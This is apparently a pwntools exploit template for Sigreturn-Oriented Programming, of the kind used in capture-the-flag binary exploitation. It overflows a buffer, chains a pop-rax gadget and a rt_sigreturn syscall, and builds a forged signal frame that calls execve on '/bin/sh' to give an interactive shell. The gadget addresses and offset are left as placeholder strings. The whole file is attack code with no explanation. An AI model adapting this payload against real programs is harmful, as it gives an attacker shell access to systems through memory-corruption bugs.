from pwn import *

BINARY     = "./binary name"
offset     = "your offset"           
pop_rax    = "your pop rax addr" 
syscall    = "your syscall addr"    
binsh_addr = "your bin/sh addr"

context.binary = ELF(BINARY)
context.log_level = "info"   

frame = SigreturnFrame()
frame.rax = 59  
frame.rdi = binsh_addr 
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall    

payload = b"A" * offset
payload += p64(pop_rax) 
payload += p64(0xf)      
payload += p64(syscall)   
payload += bytes(frame)    

p = process(BINARY)           
p.sendline(payload)
p.interactive()
